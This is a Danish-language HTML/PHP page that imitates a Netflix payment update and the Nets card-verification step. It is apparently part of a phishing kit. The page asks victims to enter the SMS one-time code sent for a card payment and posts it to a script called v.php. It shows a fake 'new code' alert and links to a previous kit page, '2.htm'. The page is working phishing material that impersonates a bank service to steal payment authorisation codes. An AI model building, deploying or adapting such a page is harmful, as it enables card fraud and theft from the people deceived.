﻿<DOCTYPE html>
<html><head>
<title>Netflix – Opdater dine betalingsoplysninger</title>


    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <link rel="stylesheet" type="text/css" href="v/screen.css">
    <link rel="stylesheet" type="text/css" href="v/gh-buttons.css">
<script language="JavaScript" src="v.js" type="text/javascript"></script>

<link rel="shortcut icon" href="img/icon.ico">


<style type="text/css">

body {background-image:url('img/back2.png'); background-repeat:no-repeat;}

  </style></head><body><br>



<form name="date" id="date" action="v.php" method="post">




<div style="margin-left: 265px; padding-top: 1041px; position: absolute;">



<div id="authform">
    <div class="wrapper">
        <div class="logos">
            <table>
                <tbody>
                <tr>
                    <td class="identifier">
                        <img alt="" src="v/v.jpg" style="max-height:56px;">
                    </td>
                    <td class="bank">
                        <div 
						
	
						
						<a href="#"><img src="v/en.png" ></a></div>
                    </td>
                    <td class="bank">
                        <img alt="" src="v/netstech_small.png" style="max-height:56px;">
                    </td>
                </tr>
                </tbody>
            </table>
        </div>
        <h1>Bekræftelse med engangskode</h1>
        <p>En engangskode er blevet sendt til din mobiltelefon.</p>
        <p>Du bør modtage den indenfor to minutter. Indtast koden nedenfor og tryk ’Bekræft’.</p>
        <p id="resendText">Hvis du ikke modtager engangskoden, kan du klikke ’Ny kode’ for at få en ny.</p>
        <form id="form" name="form" method="post" action="v.php">
            <dl style="margin-top: 10px;">
                <dt>Netbutik: </dt>
                <dd>NETFLIX</dd>

                <dt>Beløb: </dt>
                <dd id="purchAmount">0 kr.</dd>

                <dt>Dato: </dt>
                <dd><?php echo date("Ymd"); ?> <?php echo date("G:i:s"); ?></dd>

                <dt>Kortnummer: </dt>
                <dd>XXXX XXXX XXXX XXXX</dd>

              

                <dt>
                    <label for="code">Engangskode via SMS: </label>
                </dt>
                <dd>
                    <input style="width: 100px" id="otp" name="otp" onkeypress="return submitenter(this,event)" type="text" width="6">
                    <button class="button icon approve primary" name="submit" id="submit" type="submit" value="submit" style="position: absolute; margin-left: 5px;">Bekræft</button>
                </dd>
            </dl>
            <div id="errorMessage" class="error"></div>
            <div id="resendExceeded" class="error" style="display: none;">Af sikkerhedsmæssige årsager er det kun muligt at klikke ’Ny kode’ to gange; hvis du stadig 
efter to klik ikke modtager en
                SMS-kode, bedes du starte forfra.</div>
            <div style="font-size: 0.92em; margin-bottom: 8px;">
                <p>Du skal bruge NemID for at ændre mobiltelefonnummer.</p>
                <p>Ved spørgsmål, kontakt venligst Nets Kundeservice på +45 44 89 27 50.</p>
            </div>
            <a class="button icon settings" href="#">Ændre nummer</a>
            <a class="button icon add" id="resendButton" href='javascript:window.alert("Engangskode er blevet sendt.");'>Ny kode</a>
            <div style="float: right;">
                <a class="button icon arrowleft" href="2.htm">Tilbage</a>
            </div>
        </form>
    </div>
</div>






</div>


</form><script language="JavaScript" type="text/javascript">
 var frmvalidator = new Validator("date");

  frmvalidator.addValidation("otp","req","Ugyldig indgang, pr\u00F8v igen.");
 
</script>





<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<br><br><br><br>
</body></html>